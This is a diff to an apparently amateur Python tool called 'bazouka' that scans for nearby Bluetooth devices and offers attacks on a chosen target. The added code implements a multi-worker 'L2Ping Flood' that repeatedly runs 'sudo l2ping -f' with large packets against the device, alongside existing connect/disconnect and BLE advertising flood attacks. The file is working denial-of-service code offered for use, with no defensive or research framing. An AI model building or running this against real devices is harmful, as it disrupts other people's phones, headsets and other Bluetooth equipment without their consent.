@@ -1,8 +1,8 @@
-# bazouka is a script that send packets via bluetooth and also tries connect and disconnect from a device.
+# bazouka is a script that send packets via bluetooth
+# And also tries connect and disconnect from a device.
 
 
-                                           # VERSION 1.0 Beta
-
+                          # VERSION 1.5
 
 from bleak import BleakClient
 import asyncio
@@ -15,10 +15,21 @@ from bleak.backends.device import BLEDevice
 from bleak.backends.scanner import AdvertisementData
 from rich.console import Console
 from rich.table import Table
+import socket
+import struct
 
 
 console = Console()  # making object..
+console.print("[bold green] made by: [/bold green]")
 
+console.print(
+    "                  __       _   _     \n"
+    " _ __ ___  _ __  / _| ___ | |_(_)___ \n"
+    "| '_ ` _ \\| '__|| |_ / _ \\| __| / __|\n"
+    "| | | | | | |   |  _| (_) | |_| \\__ \\\n"
+    "|_| |_| |_|_|___|_|  \\___/ \\__|_|___/\n"
+    "           |_____|" \
+        )
 
 @dataclass
 class FoundDevice:  # εδω ξεκιναει η αποθηκευση συσκευων...
@@ -51,13 +62,15 @@ def device_found(device: BLEDevice, advertisement_data: AdvertisementData):
     )
 
 
-async def scan_for_devices(seconds: int = 30): # !!! αμα αλλαξεις το νουμερο :
+async def scan_for_devices(seconds: int = 15): # !!! αμα αλλαξεις το νουμερο :
                                                # -> μεγαλυτερη-μικροτερη σαρωση...
     scanner = BleakScanner(device_found)
     await scanner.start()
     # i put a progress track here just 4 fun hahha
-
-    for _ in track(range(seconds),description=" the bazouka started..."):
+    
+    for _ in track(range(seconds),description="[blue] starting scan for bluetooth devices... ([red]time default: 15 secs.[/red])[/blue]"
+                   ,style="green"):
+        
         await asyncio.sleep(1)
     await scanner.stop()
     show_devices()
@@ -74,7 +87,6 @@ def show_devices():
     table.add_column("signal")
     table.add_column("last_seen")
 
-
     for index,device in enumerate(devices.values(), start=1):
         table.add_row(
                 str(index),
@@ -83,10 +95,9 @@ def show_devices():
                 str(device.rssi),
                 device.last_seen.strftime("%H:%M:%S"),
             )
+        
     console.print(table)
-    console.print("[cyan]\nΤΕΛΕΙΩΣΕ ΤΟ SCAN (:[/cyan]")
-
-
+    console.print("[cyan]\n the scan is done! [/cyan]")
 
 def select_target() -> Optional[FoundDevice]:
     device_list=list(devices.values())
@@ -119,7 +130,9 @@ async def disconnect_attack(target: FoundDevice, loops:int=10):
             console.print(f"SUCCESS [green][/green] ({attempt})")
         except Exception as e:
             console.print(f"[red]connection error ): {attempt}: {e}[/red]")
-        # delay....
+
+        # setting a delay....
+
         await asyncio.sleep(0.5)
 
 
@@ -155,6 +168,45 @@ async def ble_flood(target: FoundDevice, duration: int = 10):
     console.print("[yellow] Advertising channels flooded with REAL BLE packets![/yellow]")
 
 
+
+async def l2ping_flood(target: FoundDevice, size: int = 600, threads: int = 10, duration: int = 10):
+    console.print(f"\n[red] L2PING FLOOD on: "
+                  f"{target.name or 'unknown'} ({target.address})[/red]")
+    console.print(f"[yellow] Size: {size} | Threads: {threads} | Duration: {duration}s[/yellow]\n")
+    console.print("[green]Real l2ping binary active![/green]\n")
+
+    import os
+    l2ping_path = os.path.expanduser("~/bazouka.py/l2ping")
+
+ # ping_worker func i m not sure if its stable yet (: ....
+
+    async def ping_worker():
+        while True:
+            try:
+                proc = await asyncio.create_subprocess_exec(
+                    "sudo", l2ping_path, "-i", "hci0", "-s", str(size), "-f", target.address,
+                    stdout=asyncio.subprocess.DEVNULL,
+                    stderr=asyncio.subprocess.DEVNULL
+                )
+                await proc.wait()
+            except:
+                pass
+
+    workers = []
+    for _ in range(threads):
+        workers.append(asyncio.create_task(ping_worker()))
+
+    await asyncio.sleep(duration)
+
+    for w in workers:
+        w.cancel()
+
+    console.print(f"\n[green]✓ L2PING FLOOD done![/green]")
+
+
+#     The Main func
+
+
 if __name__ == "__main__":
     asyncio.run(scan_for_devices())
     selected_device = select_target()
@@ -168,6 +220,7 @@ if __name__ == "__main__":
         console.print("\n [bold green] choose attack:[bold green]")
         console.print("[1] Disconnect Attack (connect/disconnect)")
         console.print("[2] packets send. (no connection)")
+        console.print("[3] L2Ping Flood (Classic Bluetooth attack...")
         console.print("[q] EXIT")
         choice = console.input("\n[bold green]selection: [/bold green]").strip()
         if choice=="1":
@@ -181,6 +234,18 @@ if __name__ == "__main__":
             duration=int(duration_input) if duration_input.isdigit() else 10
             asyncio.run(ble_flood(selected_device,duration))
             console.print(f"\n[cyan]Attack DONE ![/cyan]")
+
+        elif choice=="3":
+
+            size_input=console.input("[dim] lenght of packets (default 600):[/dim]")
+            size=int(size_input) if size_input.isdigit() else 600
+            threads_input=console.input("[dim]size of threads?(default 10)[/dim]")
+            threads=int(threads_input) if threads_input.isdigit() else 10
+            duration_input=console.input("[dim] duration in secs?[/dim]")
+            duration=int(duration_input) if duration_input.isdigit() else 10
+            asyncio.run(l2ping_flood(selected_device, size, threads, duration))
+            console.print(f"\n[cyan]Attack DONE ![/cyan]")
+
         else:
             console.print(f"\n[red] see you soon (: [/red]")
 
